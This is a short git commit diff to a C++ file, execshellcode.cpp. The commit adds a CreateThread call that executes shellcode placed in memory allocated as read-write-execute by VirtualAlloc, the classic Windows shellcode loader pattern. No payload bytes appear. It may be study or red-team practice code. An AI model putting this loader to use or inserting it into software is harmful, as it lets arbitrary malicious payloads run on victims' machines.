9570e82bede25e0e28225d902b03ac955719f11e
Major2000 <majormadobe@gmail.com>
2022-09-27 14:41:16 +0300

    created thread

--- execshellcode.cpp
+++ execshellcode.cpp
@@ -9,6 +9,6 @@ int main()
 
     exec_mem = VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // Allocate memory in a specific region 
     RtlMoveMemory(exec_mem, shellcode, shellcode_size); // move the shellcode to the allocated memory region
+    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL); // create a thread and execute code, points to the memory location created using virtualAlloc
     
-
 }
